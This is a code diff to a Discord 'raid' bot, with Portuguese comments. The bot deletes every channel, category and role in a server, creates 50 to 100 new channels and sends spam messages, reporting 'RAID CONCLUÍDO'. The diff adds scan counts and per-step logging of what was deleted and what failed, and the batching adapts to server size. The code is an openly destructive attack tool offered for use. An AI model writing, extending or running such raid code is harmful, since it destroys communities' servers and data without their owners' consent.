@@ -804,6 +804,7 @@ async def delete_all_channels(guild):
     """Apaga TODOS os canais — adapta pro tamanho do servidor"""
     size_type, total, batch_size, delay = detect_server_size(guild)
     channels = [ch for ch in list(guild.channels) if not isinstance(ch, discord.CategoryChannel)]
+    print(f"      [SCAN] {len(channels)} canais encontrados para apagar")
     
     if size_type == "small":
         # Pequeno: tudo paralelo instantâneo
@@ -824,6 +825,8 @@ async def delete_all_channels(guild):
             if i + batch_size < total:
                 await asyncio.sleep(delay)
     
+    failed = len(channels) - deleted
+    print(f"      [RESULT] {deleted}/{len(channels)} apagados | {failed} falharam")
     return deleted
 
 
@@ -831,6 +834,7 @@ async def delete_all_categories(guild):
     """Apaga TODAS as categorias — adapta pro tamanho"""
     size_type, total, batch_size, delay = detect_server_size(guild)
     cats = list(guild.categories)
+    print(f"      [SCAN] {len(cats)} categorias encontradas para apagar")
     
     if size_type == "small":
         tasks = [delete_channel_fast(cat) for cat in cats]
@@ -846,22 +850,40 @@ async def delete_all_categories(guild):
             if i + batch_size < len(cats):
                 await asyncio.sleep(delay)
     
+    failed = len(cats) - deleted
+    print(f"      [RESULT] {deleted}/{len(cats)} apagadas | {failed} falharam")
     return deleted
 
 
 async def delete_all_roles(guild):
-    """Apaga todas as roles"""
+    """Apaga todas as roles — mostra quais apagou e quais não"""
     deleted = 0
+    skipped = 0
+    failed = 0
+    deleted_names = []
+    skipped_names = []
+    
     for role in list(guild.roles):
         try:
             if role.is_default():
                 continue
             if role.position >= guild.me.top_role.position:
+                skipped += 1
+                skipped_names.append(role.name)
                 continue
             await role.delete()
             deleted += 1
+            deleted_names.append(role.name)
         except Exception:
-            pass
+            failed += 1
+            skipped_names.append(role.name)
+    
+    print(f"      [RESULT] {deleted} apagadas | {len(skipped_names)} acima do bot | {failed} falharam")
+    if deleted_names:
+        print(f"      ✅ Apagadas: {', '.join(deleted_names[:10])}{'...' if len(deleted_names) > 10 else ''}")
+    if skipped_names:
+        print(f"      ⚠️  Não apagadas (acima do bot): {', '.join(skipped_names[:10])}{'...' if len(skipped_names) > 10 else ''}")
+    
     return deleted
 
 
@@ -1174,20 +1196,24 @@ async def on_message(message):
 
         print("\n[RAID] INICIANDO RAID COMPLETO...")
 
+        # Escaneia o servidor
+        total_channels = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
+        total_cats = len(guild.categories)
+        total_roles = len([r for r in guild.roles if not r.is_default()])
+        size_type, _, _, _ = detect_server_size(guild)
+        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | {total_roles} roles | Método: {size_type}")
+
         # Fase 1: Apagar canais (PARALELO)
-        print("[1/5] Apagando canais (paralelo)...")
+        print("[1/5] Apagando canais...")
         deleted_ch = await delete_all_channels(guild)
-        print(f"      {deleted_ch} canais apagados")
 
         # Fase 2: Apagar categorias (PARALELO)
-        print("[2/5] Apagando categorias (paralelo)...")
+        print("[2/5] Apagando categorias...")
         deleted_cat = await delete_all_categories(guild)
-        print(f"      {deleted_cat} categorias apagadas")
 
         # Fase 3: Apagar roles
         print("[3/5] Apagando roles...")
         deleted_r = await delete_all_roles(guild)
-        print(f"      {deleted_r} roles apagadas")
 
         # Fase 4: Criar canais (PARALELO)
         print("[4/5] Criando 50 canais (paralelo)...")
@@ -1210,9 +1236,9 @@ async def on_message(message):
         try:
             await message.channel.send(
                 f"✅ RAID CONCLUÍDO!\n"
-                f"📡 {deleted_ch} canais apagados\n"
-                f"🗂️ {deleted_cat} categorias apagadas\n"
-                f"🗑️ {deleted_r} roles apagadas\n"
+                f"📡 {deleted_ch}/{total_channels} canais apagados\n"
+                f"🗂️ {deleted_cat}/{total_cats} categorias apagadas\n"
+                f"🗑️ {deleted_r}/{total_roles} roles apagadas\n"
                 f"📂 {created} novos canais\n"
                 f"💬 {sent} mensagens enviadas\n"
                 f"💾 Backup salvo (com permissões)"
@@ -1257,22 +1283,20 @@ async def on_message(message):
         total_channels = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
         total_cats = len(guild.categories)
         total_roles = len([r for r in guild.roles if not r.is_default()])
-        print(f"[SCAN] Servidor: {guild.name} | {total_channels} canais | {total_cats} categorias | {total_roles} roles")
+        size_type, _, _, _ = detect_server_size(guild)
+        print(f"[SCAN] {total_channels} canais | {total_cats} categorias | {total_roles} roles | Método: {size_type}")
 
-        # Fase 1: Apagar canais (lotes com retry)
-        print("[1/5] Apagando canais (lotes com retry)...")
+        # Fase 1: Apagar canais
+        print("[1/5] Apagando canais...")
         deleted_ch = await delete_all_channels(guild)
-        print(f"      {deleted_ch}/{total_channels} canais apagados")
 
         # Fase 2: Apagar categorias
-        print("[2/5] Apagando categorias (paralelo)...")
+        print("[2/5] Apagando categorias...")
         deleted_cat = await delete_all_categories(guild)
-        print(f"      {deleted_cat}/{total_cats} categorias apagadas")
 
         # Fase 3: Apagar roles
         print("[3/5] Apagando roles...")
         deleted_r = await delete_all_roles(guild)
-        print(f"      {deleted_r} roles apagadas")
 
         # Fase 4: Criar 100 canais (em lotes)
         print("[4/5] Criando 100 canais (lotes)...")
